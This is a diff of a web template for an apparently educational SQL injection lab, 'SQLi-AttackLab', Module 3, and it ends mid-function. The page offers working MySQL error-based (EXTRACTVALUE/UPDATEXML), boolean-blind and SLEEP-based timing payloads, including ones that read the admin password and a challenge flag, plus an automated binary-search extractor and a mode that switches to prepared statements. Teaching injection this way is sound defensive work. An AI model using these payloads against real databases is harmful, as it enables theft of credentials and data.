@@ -3,68 +3,812 @@
 {% block title %}Module 3: Error & Blind Inference | SQLi-AttackLab (MySQL){% endblock %}
 
 {% block content %}
-<div class="max-w-4xl mx-auto space-y-6">
+<div class="space-y-6">
 
-    <div class="pb-4 border-b border-gray-800 flex items-center justify-between">
+    <!-- Header & Scenario Badges -->
+    <div class="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4 pb-4 border-b border-gray-800">
         <div>
             <div class="flex items-center space-x-2">
-                <span class="text-xs font-bold px-2 py-0.5 rounded bg-amber-500/20 text-amber-400 border border-amber-500/30 uppercase font-mono">Module 3</span>
-                <span class="text-xs text-gray-400 font-mono">In Development</span>
+                <span class="text-xs font-bold px-2.5 py-0.5 rounded bg-amber-500 text-gray-950 uppercase font-mono">Module 3</span>
+                <span class="text-xs text-amber-400 font-mono">Interactive Laboratory</span>
             </div>
             <h1 class="text-2xl font-black text-white mt-1">Error-Based & Blind/Time-Based Inference Attacks</h1>
-            <p class="text-xs text-gray-400 mt-0.5">Extract data without visible SQL query output using database syntax errors and time delays.</p>
+            <p class="text-xs text-gray-400 mt-0.5">Extract database schema and secrets without visible SELECT result projection using MySQL syntax errors, boolean truth oracles, and time delays.</p>
         </div>
-        <a href="/lab/auth-bypass" class="px-3.5 py-1.5 rounded-lg bg-emerald-500 hover:bg-emerald-600 text-gray-950 font-bold text-xs transition">
-            Launch Module 1 Lab &rarr;
-        </a>
+
+        <!-- Mode Toggle (Vulnerable vs Remediated) -->
+        <div class="flex items-center bg-gray-900 p-1.5 rounded-xl border border-gray-800 space-x-1">
+            <button id="mode-vuln" onclick="setMode('vulnerable')" class="px-3.5 py-1.5 rounded-lg text-xs font-bold transition flex items-center space-x-1.5 bg-rose-500/20 text-rose-400 border border-rose-500/30">
+                <span class="w-2 h-2 rounded-full bg-rose-500"></span>
+                <span>Vulnerable (Dynamic)</span>
+            </button>
+            <button id="mode-secure" onclick="setMode('secure')" class="px-3.5 py-1.5 rounded-lg text-xs font-bold transition flex items-center space-x-1.5 text-gray-400 hover:text-gray-200">
+                <span class="w-2 h-2 rounded-full bg-gray-600"></span>
+                <span>Remediated (Prepared)</span>
+            </button>
+        </div>
     </div>
 
-    <!-- Syllabus & Architecture Plan Card -->
-    <div class="p-6 rounded-2xl bg-gray-900 border border-gray-800 space-y-6">
-        <h2 class="text-lg font-bold text-white flex items-center space-x-2">
-            <i data-lucide="eye-off" class="w-5 h-5 text-amber-400"></i>
-            <span>Module 3 Architecture & Inference Vectors</span>
-        </h2>
+    <!-- Scenario Selector -->
+    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
+        <button onclick="setScenario('xpath_error')" id="tab-xpath_error" class="p-3 rounded-xl text-left border transition bg-amber-500/10 border-amber-500/40 text-amber-400">
+            <div class="text-[10px] font-mono font-bold uppercase tracking-wider mb-1 flex items-center justify-between">
+                <span>Phase 3.1</span>
+                <i data-lucide="check" class="w-3.5 h-3.5"></i>
+            </div>
+            <div class="text-sm font-bold text-white">XPath Error Disclosure</div>
+            <div class="text-xs text-gray-400 mt-1 code-font truncate">EXTRACTVALUE / Error 1105</div>
+        </button>
 
-        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-            <div class="p-4 rounded-xl bg-gray-950/60 border border-gray-800 space-y-2">
-                <div class="text-xs font-mono font-bold text-amber-400">Section 3.1</div>
-                <div class="text-sm font-bold text-white">XPath / EXTRACTVALUE() Error Injection</div>
-                <p class="text-xs text-gray-400 leading-relaxed">
-                    Triggering MySQL XPath syntax errors with `EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))` to leak data inside error messages.
+        <button onclick="setScenario('boolean_blind')" id="tab-boolean_blind" class="p-3 rounded-xl text-left border border-gray-800 bg-gray-900 text-gray-400 hover:border-gray-700 transition">
+            <div class="text-[10px] font-mono font-bold uppercase tracking-wider mb-1 flex items-center justify-between">
+                <span>Phase 3.2</span>
+            </div>
+            <div class="text-sm font-bold text-gray-200">Boolean-Based Blind</div>
+            <div class="text-xs text-gray-500 mt-1 code-font truncate">ASCII & SUBSTRING Oracle</div>
+        </button>
+
+        <button onclick="setScenario('time_blind')" id="tab-time_blind" class="p-3 rounded-xl text-left border border-gray-800 bg-gray-900 text-gray-400 hover:border-gray-700 transition">
+            <div class="text-[10px] font-mono font-bold uppercase tracking-wider mb-1 flex items-center justify-between">
+                <span>Phase 3.3</span>
+            </div>
+            <div class="text-sm font-bold text-gray-200">Time-Based Side-Channel</div>
+            <div class="text-xs text-gray-500 mt-1 code-font truncate">Conditional SLEEP(n) Delays</div>
+        </button>
+
+        <button onclick="setScenario('latency_profiler')" id="tab-latency_profiler" class="p-3 rounded-xl text-left border border-gray-800 bg-gray-900 text-gray-400 hover:border-gray-700 transition">
+            <div class="text-[10px] font-mono font-bold uppercase tracking-wider mb-1 flex items-center justify-between">
+                <span>Phase 3.4</span>
+            </div>
+            <div class="text-sm font-bold text-gray-200">Automated Extractor & Profiler</div>
+            <div class="text-xs text-gray-500 mt-1 code-font truncate">Binary Search & Latency Graph</div>
+        </button>
+    </div>
+
+    <!-- Main Workspace (Grid: Attack Form & Query Inspector) -->
+    <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
+
+        <!-- Left Column: Attack Form & Pre-Crafted Payloads (5 cols) -->
+        <div class="lg:col-span-5 space-y-4">
+            
+            <div class="p-5 rounded-2xl bg-gray-900 border border-gray-800 space-y-4 shadow-xl">
+                <div class="flex items-center justify-between">
+                    <h3 class="text-sm font-bold text-white flex items-center space-x-2">
+                        <i data-lucide="user-check" class="w-4 h-4 text-amber-400"></i>
+                        <span>User Directory Target Endpoint</span>
+                    </h3>
+                    <span id="badge-mode" class="text-xs px-2 py-0.5 rounded font-mono font-semibold bg-rose-500/10 text-rose-400 border border-rose-500/20">
+                        VULNERABLE ENGINE
+                    </span>
+                </div>
+
+                <!-- Form -->
+                <form id="attack-form" onsubmit="executeAttack(event)" class="space-y-4">
+                    <div>
+                        <label class="block text-xs font-medium text-gray-300 mb-1">Target Username / SQLi Payload Parameter</label>
+                        <div class="relative">
+                            <input type="text" id="input-username" value="admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) -- " 
+                                class="w-full bg-[#0b0f19] border border-gray-700 rounded-lg px-3.5 py-2.5 text-sm text-amber-400 code-font focus:outline-none focus:border-amber-500 focus:ring-1 focus:ring-amber-500 transition"
+                                placeholder="Enter username or injection payload" required>
+                        </div>
+                    </div>
+
+                    <div class="flex gap-2">
+                        <button type="submit" id="btn-submit" class="flex-grow py-2.5 px-4 rounded-lg bg-amber-500 hover:bg-amber-600 text-gray-950 font-bold text-sm transition flex items-center justify-center space-x-2 shadow-lg shadow-amber-500/20">
+                            <i data-lucide="play" class="w-4 h-4 fill-current"></i>
+                            <span>Execute Query in MySQL</span>
+                        </button>
+                    </div>
+                </form>
+
+                <!-- Quick Payload Injection Buttons -->
+                <div class="pt-3 border-t border-gray-800 space-y-2">
+                    <div class="text-xs font-semibold text-gray-400 flex items-center justify-between">
+                        <span>Pre-crafted Attack Vectors:</span>
+                        <span class="text-gray-500 text-[10px]">Click to populate</span>
+                    </div>
+                    <div class="flex flex-wrap gap-1.5" id="quick-payloads">
+                        <!-- Populated dynamically based on active scenario -->
+                    </div>
+                </div>
+
+            </div>
+
+            <!-- Scenario Walkthrough / Explanation Box -->
+            <div class="p-5 rounded-2xl bg-gray-900 border border-gray-800 space-y-2.5 text-xs text-gray-300">
+                <div class="font-bold text-white flex items-center space-x-1.5">
+                    <i data-lucide="info" class="w-4 h-4 text-amber-400"></i>
+                    <span id="scenario-title">Scenario Mechanism</span>
+                </div>
+                <p id="scenario-desc" class="leading-relaxed text-gray-400">
+                    The target endpoint constructs: 
+                    <code>SELECT id, username, full_name, email, role FROM users WHERE username = '[INPUT]'</code>.
+                    By triggering deliberate XPath syntax errors or injecting boolean and timing functions, an attacker exfiltrates data even when output fields are not reflected.
                 </p>
             </div>
 
-            <div class="p-4 rounded-xl bg-gray-950/60 border border-gray-800 space-y-2">
-                <div class="text-xs font-mono font-bold text-amber-400">Section 3.2</div>
-                <div class="text-sm font-bold text-white">Boolean-Based Blind Character Extraction</div>
-                <p class="text-xs text-gray-400 leading-relaxed">
-                    Iterating through ASCII byte values with `ASCII(SUBSTRING((SELECT database()), 1, 1)) > 100` via binary search algorithms.
+            <!-- Automated Blind Extractor Workbench -->
+            <div class="p-5 rounded-2xl bg-gray-900 border border-gray-800 space-y-3.5 text-xs shadow-xl">
+                <div class="flex items-center justify-between">
+                    <div class="font-bold text-white flex items-center space-x-2">
+                        <i data-lucide="cpu" class="w-4 h-4 text-amber-400"></i>
+                        <span>Algorithmic Blind Extractor (Runner)</span>
+                    </div>
+                    <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-amber-500/20 text-amber-300 border border-amber-500/30">Binary Search</span>
+                </div>
+                <p class="text-gray-400 text-[11px] leading-relaxed">
+                    Watch the automated oracle runner extract characters dynamically via binary search ASCII comparisons in real time:
                 </p>
+
+                <div class="space-y-2">
+                    <div class="flex gap-2">
+                        <select id="extractor-target" class="flex-grow bg-[#0b0f19] border border-gray-700 rounded-lg px-2.5 py-1.5 text-xs text-gray-200 code-font focus:outline-none focus:border-amber-500">
+                            <option value="database()">Target: database()</option>
+                            <option value="version()">Target: version()</option>
+                            <option value="user()">Target: user()</option>
+                            <option value="(SELECT secret_value FROM system_secrets WHERE secret_name='FLAG_BLIND_EXPLOIT')">Target: FLAG_BLIND_EXPLOIT</option>
+                        </select>
+                        <button type="button" id="btn-start-extract" onclick="runAutomatedExtractor()" class="px-3 py-1.5 rounded-lg bg-amber-500 hover:bg-amber-600 text-gray-950 font-bold text-xs transition flex items-center space-x-1">
+                            <i data-lucide="zap" class="w-3.5 h-3.5"></i>
+                            <span>Start Runner</span>
+                        </button>
+                        <button type="button" id="btn-stop-extract" onclick="stopAutomatedExtractor()" class="hidden px-2.5 py-1.5 rounded-lg bg-rose-600 hover:bg-rose-700 text-white font-bold text-xs transition">
+                            Stop
+                        </button>
+                    </div>
+
+                    <!-- Live Extractor Progress Console -->
+                    <div class="p-3 rounded-xl bg-black/50 border border-gray-800 space-y-2">
+                        <div class="flex items-center justify-between text-[11px] font-mono">
+                            <span class="text-gray-400">Extracted Output:</span>
+                            <span id="extractor-stats" class="text-amber-400">0 chars | 0 queries</span>
+                        </div>
+                        <div id="extractor-output" class="p-2 rounded bg-[#070b13] border border-gray-800 code-font text-amber-300 text-sm font-bold min-h-[36px] flex items-center tracking-wider break-all">
+                            _
+                        </div>
+                        <div id="extractor-log" class="text-[10px] font-mono text-gray-500 truncate">
+                            Ready to initiate binary search inference...
+                        </div>
+                    </div>
+                </div>
             </div>
 
-            <div class="p-4 rounded-xl bg-gray-950/60 border border-gray-800 space-y-2">
-                <div class="text-xs font-mono font-bold text-amber-400">Section 3.3</div>
-                <div class="text-sm font-bold text-white">Time-Based Delays with SLEEP() & BENCHMARK()</div>
-                <p class="text-xs text-gray-400 leading-relaxed">
-                    Using conditional time delays `IF(1=1, SLEEP(3), 0)` to infer database values through network response latency measurements.
-                </p>
-            </div>
-
-            <div class="p-4 rounded-xl bg-gray-950/60 border border-gray-800 space-y-2">
-                <div class="text-xs font-mono font-bold text-amber-400">Section 3.4</div>
-                <div class="text-sm font-bold text-white">Response Latency Profiler</div>
-                <p class="text-xs text-gray-400 leading-relaxed">
-                    A real-time response time chart plotting millisecond latency differences to demonstrate time inference visually.
-                </p>
-            </div>
         </div>
 
-        <div class="p-4 rounded-xl bg-amber-950/20 border border-amber-500/20 text-xs text-amber-300 flex items-center space-x-3">
-            <i data-lucide="info" class="w-5 h-5 flex-shrink-0"></i>
-            <span>Module 3 inference architecture is defined. You can run the live <strong>Module 1: Authentication Bypass Lab</strong> immediately.</span>
+        <!-- Right Column: Real-Time Execution Inspector & Result Console (7 cols) -->
+        <div class="lg:col-span-7 space-y-4">
+
+            <!-- Live Query Inspector Card -->
+            <div class="p-5 rounded-2xl bg-gray-900 border border-gray-800 space-y-4 shadow-xl">
+                <div class="flex items-center justify-between">
+                    <h3 class="text-sm font-bold text-white flex items-center space-x-2">
+                        <i data-lucide="terminal" class="w-4 h-4 text-amber-400"></i>
+                        <span>Live MySQL Query Inspector</span>
+                    </h3>
+                    <div class="flex items-center space-x-2 font-mono text-xs">
+                        <span id="row-count" class="text-gray-400">Rows: 0</span>
+                        <span class="text-gray-600">|</span>
+                        <span id="exec-time" class="text-amber-400">0.00 ms</span>
+                    </div>
+                </div>
+
+                <!-- Query String Preview Window -->
+                <div class="p-3.5 rounded-xl bg-[#070b13] border border-gray-800">
+                    <div class="text-[11px] font-mono text-gray-500 mb-1.5 flex items-center justify-between">
+                        <span>SENT TO MYSQL SERVER:</span>
+                        <span id="query-type-badge" class="text-rose-400 font-bold text-[10px]">RAW DYNAMIC STRING</span>
+                    </div>
+                    <div id="query-display" class="code-font text-xs text-yellow-300 break-all leading-relaxed whitespace-pre-wrap">
+                        SELECT id, username, full_name, email, role FROM users WHERE username = 'admin'
+                    </div>
+                </div>
+
+                <!-- Execution Status Banner -->
+                <div id="status-banner" class="p-3 rounded-xl border flex items-center justify-between bg-gray-800/40 border-gray-700 text-gray-300">
+                    <div class="flex items-center space-x-2.5">
+                        <i data-lucide="help-circle" id="status-icon" class="w-5 h-5 text-gray-400"></i>
+                        <div>
+                            <div id="status-heading" class="text-xs font-bold text-white">Awaiting Execution</div>
+                            <div id="status-sub" class="text-[11px] text-gray-400">Submit the form or click a pre-crafted attack vector to execute in MySQL.</div>
+                        </div>
+                    </div>
+                    <div id="status-flag" class="hidden">
+                        <span class="px-2.5 py-1 rounded bg-amber-500/20 text-amber-300 border border-amber-500/40 text-xs font-mono font-bold animate-pulse">
+                            FLAG UNLOCKED
+                        </span>
+                    </div>
+                </div>
+
+                <!-- Challenge Flag Banner (if exfiltrated) -->
+                <div id="flag-card" class="hidden p-4 rounded-xl bg-amber-950/30 border border-amber-500/40 space-y-2">
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center space-x-2">
+                            <i data-lucide="award" class="w-4 h-4 text-amber-400"></i>
+                            <span class="text-xs font-bold uppercase tracking-wider text-amber-300 font-mono">Challenge Flag Exfiltrated!</span>
+                        </div>
+                        <span class="px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-amber-500 text-gray-950">
+                            FLAG CAPTURED
+                        </span>
+                    </div>
+                    <div class="text-[11px] text-gray-300">
+                        The secret flag was exfiltrated from MySQL via inference:
+                    </div>
+                    <div id="flag-text" class="text-xs font-mono font-black text-amber-300 bg-black/40 px-3 py-2 rounded border border-amber-500/30 select-all">
+                        FLAG{mysql_blind_and_error_inference_pwned}
+                    </div>
+                </div>
+
+                <!-- Scenario-Specific Panels -->
+
+                <!-- Panel 1: XPath Error Leaked Data Callout -->
+                <div id="panel-xpath" class="space-y-3">
+                    <div class="p-4 rounded-xl bg-gray-950 border border-gray-800 space-y-2">
+                        <div class="flex items-center justify-between">
+                            <span class="text-xs font-mono font-bold text-gray-400">Leaked Subquery Data (Extracted from Error 1105):</span>
+                            <span class="text-[10px] font-mono text-amber-400">32-Char Window</span>
+                        </div>
+                        <div id="xpath-leak-box" class="p-3 rounded-lg bg-black/70 border border-gray-800 text-sm code-font text-amber-400 font-bold min-h-[42px] flex items-center">
+                            <span class="text-gray-600 font-normal italic">No error disclosure yet</span>
+                        </div>
+                        <div class="text-[11px] text-gray-500 leading-normal">
+                            Note: MySQL XPath error reporting truncates disclosed strings at <strong>32 characters</strong>. Attackers use <code>SUBSTRING(val, 30, 32)</code> to extract longer credentials sequentially.
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Panel 2: Boolean-Blind Oracle Indicator -->
+                <div id="panel-boolean" class="hidden space-y-3">
+                    <div class="p-4 rounded-xl bg-gray-950 border border-gray-800 space-y-2">
+                        <div class="text-xs font-mono font-bold text-gray-400">Boolean Oracle State:</div>
+                        <div id="boolean-state-card" class="p-3 rounded-lg border text-sm font-bold flex items-center space-x-2 bg-gray-900 border-gray-800 text-gray-400">
+                            <i data-lucide="help-circle" class="w-4 h-4"></i>
+                            <span id="boolean-state-text">No condition tested yet</span>
+                        </div>
+                        <div class="text-[11px] text-gray-500 leading-normal">
+                            When the injected boolean condition evaluates to <code>TRUE</code>, the target row is matched. When <code>FALSE</code>, 0 rows return.
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Panel 3: Time-Based Side-Channel Latency Gauge -->
+                <div id="panel-time" class="hidden space-y-3">
+                    <div class="p-4 rounded-xl bg-gray-950 border border-gray-800 space-y-3">
+                        <div class="flex items-center justify-between text-xs font-mono">
+                            <span class="text-gray-400 font-bold">Response Latency Profiler:</span>
+                            <span id="latency-val" class="text-amber-400 font-bold">0.00 ms</span>
+                        </div>
+                        <!-- Latency Progress Bar -->
+                        <div class="w-full bg-gray-900 rounded-full h-3 overflow-hidden border border-gray-800 relative">
+                            <div id="latency-bar" class="bg-emerald-500 h-3 rounded-full transition-all duration-500" style="width: 2%"></div>
+                        </div>
+                        <div class="flex items-center justify-between text-[10px] font-mono text-gray-500">
+                            <span>0 ms (Baseline)</span>
+                            <span class="text-amber-400 font-semibold">1000 ms (Threshold)</span>
+                            <span>3000 ms+</span>
+                        </div>
+                        <div id="latency-verdict" class="text-xs p-2.5 rounded-lg bg-gray-900 border border-gray-800 text-gray-400 font-mono flex items-center space-x-2">
+                            <i data-lucide="activity" class="w-4 h-4 text-gray-500"></i>
+                            <span id="latency-verdict-text">Execute a SLEEP() query to test latency threshold.</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Matched User Record Table (if returned) -->
+                <div class="space-y-2">
+                    <div class="flex items-center justify-between text-xs font-semibold text-gray-400">
+                        <span>Database Query Results:</span>
+                        <span id="table-badge" class="font-mono text-[10px] text-gray-500">0 records</span>
+                    </div>
+                    <div class="overflow-x-auto rounded-xl border border-gray-800 bg-[#070b13]">
+                        <table class="w-full text-left text-xs code-font">
+                            <thead class="bg-gray-950 text-gray-400 border-b border-gray-800 uppercase text-[10px]">
+                                <tr>
+                                    <th class="p-2.5">ID</th>
+                                    <th class="p-2.5">Username</th>
+                                    <th class="p-2.5">Full Name</th>
+                                    <th class="p-2.5">Email</th>
+                                    <th class="p-2.5">Role</th>
+                                </tr>
+                            </thead>
+                            <tbody id="results-table-body" class="divide-y divide-gray-800/60">
+                                <tr>
+                                    <td colspan="5" class="p-4 text-center text-gray-500">
+                                        No query executed yet. Run a search above.
+                                    </td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <!-- Real-time Explanation Banner -->
+                <div class="p-4 rounded-xl bg-gray-950 border border-gray-800 space-y-1.5">
+                    <div class="text-xs font-bold text-gray-300 flex items-center space-x-1.5">
+                        <i data-lucide="shield-alert" class="w-4 h-4 text-amber-400"></i>
+                        <span>Technical Analysis & Mitigation:</span>
+                    </div>
+                    <p id="explanation-text" class="text-xs text-gray-400 leading-relaxed font-sans">
+                        Submit a query to inspect how MySQL processes the input in the selected engine mode.
+                    </p>
+                </div>
+
+            </div>
+
+        </div>
+
+    </div>
+
+    <!-- Live Audit Logs Card -->
+    <div class="p-5 rounded-2xl bg-gray-900 border border-gray-800 space-y-3 shadow-xl">
+        <div class="flex items-center justify-between">
+            <h3 class="text-sm font-bold text-white flex items-center space-x-2">
+                <i data-lucide="shield" class="w-4 h-4 text-amber-400"></i>
+                <span>Database Query Audit Log (query_audit_logs)</span>
+            </h3>
+            <button onclick="fetchAuditLogs()" class="text-xs px-2.5 py-1 rounded bg-gray-800 hover:bg-gray-700 text-gray-300 transition flex items-center space-x-1 font-mono">
+                <i data-lucide="refresh-cw" class="w-3 h-3"></i>
+                <span>Refresh Logs</span>
+            </button>
+        </div>
+        <div class="overflow-x-auto rounded-xl border border-gray-800 bg-[#070b13]">
+            <table class="w-full text-left text-xs code-font">
+                <thead class="bg-gray-950 text-gray-400 border-b border-gray-800 uppercase text-[10px]">
+                    <tr>
+                        <th class="p-2.5">ID</th>
+                        <th class="p-2.5">Module</th>
+                        <th class="p-2.5">Executed Query</th>
+                        <th class="p-2.5">Prepared?</th>
+                        <th class="p-2.5">Status</th>
+                        <th class="p-2.5">Timestamp</th>
+                    </tr>
+                </thead>
+                <tbody id="audit-table-body" class="divide-y divide-gray-800/60">
+                    <tr>
+                        <td colspan="6" class="p-3 text-center text-gray-500">Loading audit telemetry...</td>
+                    </tr>
+                </tbody>
+            </table>
         </div>
     </div>
 
 </div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+    let currentScenario = 'xpath_error';
+    let currentMode = 'vulnerable';
+    let extractorRunning = false;
+    let extractorAbort = false;
+
+    const quickPayloadsByScenario = {
+        'xpath_error': [
+            { label: 'Version (EXTRACTVALUE)', payload: "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) -- " },
+            { label: 'Database Name', payload: "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e)) -- " },
+            { label: 'Current User', payload: "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e)) -- " },
+            { label: 'Extract Flag (Chunk 1)', payload: "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT secret_value FROM system_secrets WHERE secret_name='FLAG_BLIND_EXPLOIT'), 0x7e)) -- " },
+            { label: 'Extract Flag (Chunk 2)', payload: "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING(secret_value, 30, 32) FROM system_secrets WHERE secret_name='FLAG_BLIND_EXPLOIT'), 0x7e)) -- " },
+            { label: 'Password (UPDATEXML)', payload: "admin' AND UPDATEXML(1, CONCAT(0x7e, (SELECT password FROM users WHERE username='admin'), 0x7e), 1) -- " }
+        ],
+        'boolean_blind': [
+            { label: "Database 1st char == 's' (True)", payload: "admin' AND ASCII(SUBSTRING((SELECT database()), 1, 1)) = 115 -- " },
+            { label: "Database 1st char == 'c' (False)", payload: "admin' AND ASCII(SUBSTRING((SELECT database()), 1, 1)) = 99 -- " },
+            { label: "Database 1st char > 100 (True)", payload: "admin' AND ASCII(SUBSTRING((SELECT database()), 1, 1)) > 100 -- " },
+            { label: "Flag 1st char == 'F' (True)", payload: "admin' AND (SELECT SUBSTRING(secret_value, 1, 1) FROM system_secrets WHERE secret_name='FLAG_BLIND_EXPLOIT') = 'F' -- " },
+            { label: "Flag 1st char == 'Z' (False)", payload: "admin' AND (SELECT SUBSTRING(secret_value, 1, 1) FROM system_secrets WHERE secret_name='FLAG_BLIND_EXPLOIT') = 'Z' -- " }
+        ],
+        'time_blind': [
+            { label: "If char == 's' SLEEP(2) (True)", payload: "admin' AND IF(ASCII(SUBSTRING(database(), 1, 1)) = 115, SLEEP(2), 0) -- " },
+            { label: "If char == 'z' SLEEP(2) (False)", payload: "admin' AND IF(ASCII(SUBSTRING(database(), 1, 1)) = 122, SLEEP(2), 0) -- " },
+            { label: "Unconditional SLEEP(2)", payload: "admin' AND SLEEP(2) -- " },
+            { label: "SLEEP(1) Probe", payload: "admin' AND SLEEP(1) -- " },
+            { label: "SLEEP(3) Deep Delay", payload: "admin' AND SLEEP(3) -- " }
+        ],
+        'latency_profiler': [
+            { label: "Baseline Query (0s)", payload: "admin" },
+            { label: "SLEEP(1) Delay", payload: "admin' AND SLEEP(1) -- " },
+            { label: "SLEEP(2) Delay", payload: "admin' AND SLEEP(2) -- " },
+            { label: "Flag Blind Timing Test", payload: "admin' AND IF((SELECT SUBSTRING(secret_value, 1, 1) FROM system_secrets WHERE secret_name='FLAG_BLIND_EXPLOIT') = 'F', SLEEP(2), 0) -- " }
+        ]
+    };
+
+    const scenarioMeta = {
+        'xpath_error': {
+            title: "XPath Syntax Error Disclosure Mechanism (CWE-209)",
+            desc: "MySQL provides XML query functions `EXTRACTVALUE(xml_frag, xpath_expr)` and `UPDATEXML(xml_target, xpath_expr, new_val)`. If the second parameter starts with an invalid XPath character (such as `0x7e` / '~'), MySQL throws Error 1105 (`XPATH syntax error: '~...~'`) containing the evaluated subquery result! Because MySQL limits error strings to 32 characters, attackers use `SUBSTRING()` windowing to extract long secrets in segments."
+        },
+        'boolean_blind': {
+            title: "Boolean-Based Blind Inference Oracle",
+            desc: "When error messages and query outputs are completely suppressed, attackers turn the database into a True/False oracle. By injecting predicates like `AND ASCII(SUBSTRING((SELECT ...), 1, 1)) > 96`, a TRUE condition returns the normal user record, while a FALSE condition returns 0 records. Using binary search over the ASCII range (32..126), any character can be deduced in just ~7 queries!"
+        },
+        'time_blind': {
+            title: "Time-Based Side-Channel Latency Injection",
+            desc: "When application responses are completely uniform for both True and False conditions, attackers exploit asynchronous latency via MySQL's `SLEEP(seconds)` function. Using `IF(condition, SLEEP(2), 0)`, the database only pauses if the condition evaluates to TRUE. By observing HTTP response time (>1000ms vs <50ms), data is exfiltrated through the timing channel."
+        },
+        'latency_profiler': {
+            title: "Algorithmic Automation & Latency Profiling",
+            desc: "Manual blind extraction is tedious. Automated tools like SQLMap automate character extraction via binary search algorithms. Use the Algorithmic Blind Extractor on the left to watch binary search deduce strings live, and observe how parameterized queries completely stop the timing side-channel."
+        }
+    };
+
+    function setScenario(scenarioKey) {
+        currentScenario = scenarioKey;
+
+        // Update Tab styles
+        ['xpath_error', 'boolean_blind', 'time_blind', 'latency_profiler'].forEach(key => {
+            const tab = document.getElementById(`tab-${key}`);
+            if (key === scenarioKey) {
+                tab.className = "p-3 rounded-xl text-left border transition bg-amber-500/10 border-amber-500/40 text-amber-400";
+            } else {
+                tab.className = "p-3 rounded-xl text-left border border-gray-800 bg-gray-900 text-gray-400 hover:border-gray-700 transition";
+            }
+        });
+
+        // Update Explanations
+        const meta = scenarioMeta[scenarioKey];
+        document.getElementById('scenario-title').innerText = meta.title;
+        document.getElementById('scenario-desc').innerText = meta.desc;
+
+        // Update panels visibility
+        document.getElementById('panel-xpath').classList.toggle('hidden', scenarioKey !== 'xpath_error');
+        document.getElementById('panel-boolean').classList.toggle('hidden', scenarioKey !== 'boolean_blind');
+        document.getElementById('panel-time').classList.toggle('hidden', scenarioKey !== 'time_blind' && scenarioKey !== 'latency_profiler');
+
+        // Populate quick payloads
+        renderQuickPayloads();
+
+        // Populate default payload
+        const defaultPayload = quickPayloadsByScenario[scenarioKey][0].payload;
+        document.getElementById('input-username').value = defaultPayload;
+        
+        lucide.createIcons();
+    }
+
+    function renderQuickPayloads() {
+        const container = document.getElementById('quick-payloads');
+        container.innerHTML = '';
+        const list = quickPayloadsByScenario[currentScenario] || [];
+        list.forEach(item => {
+            const btn = document.createElement('button');
+            btn.type = 'button';
+            btn.className = "text-xs px-2 py-1 rounded bg-gray-800 hover:bg-gray-700 text-amber-300 code-font border border-gray-700 transition";
+            btn.innerText = item.label;
+            btn.title = item.payload;
+            btn.onclick = () => insertPayload(item.payload);
+            container.appendChild(btn);
+        });
+    }
+
+    function insertPayload(payloadText) {
+        document.getElementById('input-username').value = payloadText;
+        executeAttack();
+    }
+
+    function setMode(modeKey) {
+        currentMode = modeKey;
+        const btnVuln = document.getElementById('mode-vuln');
+        const btnSecure = document.getElementById('mode-secure');
+        const badgeMode = document.getElementById('badge-mode');
+        const queryTypeBadge = document.getElementById('query-type-badge');
+
+        if (modeKey === 'vulnerable') {
+            btnVuln.className = "px-3.5 py-1.5 rounded-lg text-xs font-bold transition flex items-center space-x-1.5 bg-rose-500/20 text-rose-400 border border-rose-500/30";
+            btnSecure.className = "px-3.5 py-1.5 rounded-lg text-xs font-bold transition flex items-center space-x-1.5 text-gray-400 hover:text-gray-200";
+            badgeMode.className = "text-xs px-2 py-0.5 rounded font-mono font-semibold bg-rose-500/10 text-rose-400 border border-rose-500/20";
+            badgeMode.innerText = "VULNERABLE ENGINE";
+            queryTypeBadge.className = "text-rose-400 font-bold text-[10px]";
+            queryTypeBadge.innerText = "RAW DYNAMIC STRING";
+        } else {
+            btnSecure.className = "px-3.5 py-1.5 rounded-lg text-xs font-bold transition flex items-center space-x-1.5 bg-emerald-500/20 text-emerald-400 border border-emerald-500/30";
+            btnVuln.className = "px-3.5 py-1.5 rounded-lg text-xs font-bold transition flex items-center space-x-1.5 text-gray-400 hover:text-gray-200";
+            badgeMode.className = "text-xs px-2 py-0.5 rounded font-mono font-semibold bg-emerald-500/10 text-emerald-400 border border-emerald-500/20";
+            badgeMode.innerText = "REMEDIATED (PREPARED)";
+            queryTypeBadge.className = "text-emerald-400 font-bold text-[10px]";
+            queryTypeBadge.innerText = "PARAMETERIZED QUERY";
+        }
+    }
+
+    async function executeAttack(event) {
+        if (event) event.preventDefault();
+        const usernameInput = document.getElementById('input-username').value;
+        const btnSubmit = document.getElementById('btn-submit');
+        
+        btnSubmit.disabled = true;
+        btnSubmit.innerHTML = `<i data-lucide="loader-2" class="w-4 h-4 animate-spin"></i><span>Executing in MySQL...</span>`;
+        lucide.createIcons();
+
+        try {
+            const resp = await fetch('/api/error-blind/query', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: usernameInput,
+                    scenario: currentScenario,
+                    mode: currentMode
+                })
+            });
+
+            const data = await resp.json();
+            renderExecutionResults(data);
+            fetchAuditLogs();
+        } catch (err) {
+            console.error(err);
+            alert("Error communicating with server API.");
+        } finally {
+            btnSubmit.disabled = false;
+            btnSubmit.innerHTML = `<i data-lucide="play" class="w-4 h-4 fill-current"></i><span>Execute Query in MySQL</span>`;
+            lucide.createIcons();
+        }
+    }
+
+    function renderExecutionResults(data) {
+        // Query Preview
+        const queryDisplay = document.getElementById('query-display');
+        if (data.query_tokens && data.query_tokens.length > 0) {
